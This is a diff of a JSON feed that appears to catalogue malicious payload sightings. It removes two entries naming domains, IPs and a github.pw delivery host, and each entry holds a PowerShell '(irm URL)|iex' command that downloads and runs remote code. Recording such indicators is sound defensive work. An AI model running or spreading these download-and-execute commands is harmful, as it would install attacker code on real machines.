@@ -531,43 +531,5 @@
     ],
     "ReportId": "cmwevvd0i0eh70omlobj2ua4c",
     "ScannedAt": "2026-11-13T11:18:22.425000+00:00"
-  },
-  {
-    "UrlDomain": "www.dpwomen.mn",
-    "DeliveryUrl": [
-      "github.pw"
-    ],
-    "PayloadUrl": [
-      "https://github.pw/8pchkbdes5/aade9cba2680d7ba"
-    ],
-    "IP": [
-      "192.254.190.216"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://github[.]pw/8pchkbdes5/aade9cba2680d7ba')|iex",
-    "ResolvedDownloadUrl": [
-      "https://github.pw/8pchkbdes5/aade9cba2680d7ba"
-    ],
-    "ReportId": "cmwetonos0e7e0omltax78jeq",
-    "ScannedAt": "2026-11-13T10:17:10.356000+00:00"
-  },
-  {
-    "UrlDomain": "delavaa.ir",
-    "DeliveryUrl": [
-      "github.pw"
-    ],
-    "PayloadUrl": [
-      "https://github.pw/8pchkbdes5/91d7167f548d874c"
-    ],
-    "IP": [
-      "88.135.68.28"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://github[.]pw/8pchkbdes5/91d7167f548d874c')|iex",
-    "ResolvedDownloadUrl": [
-      "https://github.pw/8pchkbdes5/91d7167f548d874c"
-    ],
-    "ReportId": "cmwetnpgn0e5q0omlfbiurb7r",
-    "ScannedAt": "2026-11-13T10:16:26.023000+00:00"
   }
 ]
